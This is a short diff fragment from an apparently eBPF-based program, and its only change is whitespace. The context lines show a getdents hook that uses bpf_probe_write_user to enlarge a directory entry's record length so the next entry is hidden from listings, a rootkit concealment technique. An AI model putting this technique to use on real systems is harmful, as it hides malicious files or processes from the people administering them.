@@ -210,7 +210,7 @@ int handle_getdents_patch(struct trace_event_raw_sys_exit *ctx) {
       (struct linux_dirent64 *)(buff_addr + d_reclen_previous);
   short unsigned int d_reclen = 0;
   bpf_probe_read_user(&d_reclen, sizeof(d_reclen), &dirp->d_reclen);
-  
+
   // Attempt to overwrite
   short unsigned int d_reclen_new = d_reclen_previous + d_reclen;
   long ret = bpf_probe_write_user(&dirp_previous->d_reclen, &d_reclen_new,
